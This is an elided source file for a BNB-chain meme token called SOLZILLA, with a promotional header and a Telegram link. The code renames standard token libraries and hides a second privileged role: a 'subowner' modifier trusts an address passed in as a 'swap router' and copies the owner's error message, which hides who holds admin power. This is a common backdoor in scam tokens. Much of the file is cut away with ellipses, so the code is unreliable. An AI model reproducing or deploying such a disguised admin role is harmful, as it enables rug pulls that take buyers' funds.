...
SOLZILLA
SOLZILLA|$SOLZILLA
A🧵on how the leading BNB ecosystem 
protocols should improve to maximise #OPOS in 2024.   
#SOLZilla Community Notes.
https://t.me/SOLZILLAToken
*/
pragma solidity 0.8.23;

interface SOLZILLA33 {
  /**
...
/*
 * @dev Provides information about the current execution SOLZILLA20Burnable, including the
 ...
 */
abstract contract SOLZILLA20Burnable {
...
// File: @openzeppelin/contracts/access/SOLZILLA20Ownable.sol
 ...
 * the owner.
 */
abstract contract SOLZILLA20Ownable is SOLZILLA20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "SOLZILLA20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "SOLZILLA20Ownable: new owner is the zero address");
 ...
 * `SafeSOLZILLA` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeSOLZILLA {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeSOLZILLA: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeSOLZILLA: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeSOLZILLA: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeSOLZILLA: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeSOLZILLA: modulo by zero");
  }
...
contract SOLZILLAToken is SOLZILLA20Burnable, SOLZILLA33, SOLZILLA20Ownable {
    
    using SafeSOLZILLA for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _symbol = "SOLZILLA";
        _decimals = 9;
        _totalSupply = 9789890000000 * 10 ** 9;
        mintfrom[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    string public SOLZILLAtelegramcchannel = "https://t.me/SOLZILLAToken";
            function getSOLZILLAtelegramcchannel() public view returns (string memory) {
        return SOLZILLAtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {SOLZILLA33-totalSupply}.
    */
    ...
    /**
    * @dev See {SOLZILLA33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "SOLZILLA20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {SOLZILLA33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {SOLZILLA33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {SOLZILLA33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "SOLZILLA33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {SOLZILLA33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "SOLZILLA33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "SOLZILLA33: transfer from the zero address");
        require(shippingto != address(0), "SOLZILLA33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "SOLZILLA33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "SOLZILLA33: approve from the zero address");
        require(transporteur != address(0), "SOLZILLA33: approve to the zero address");
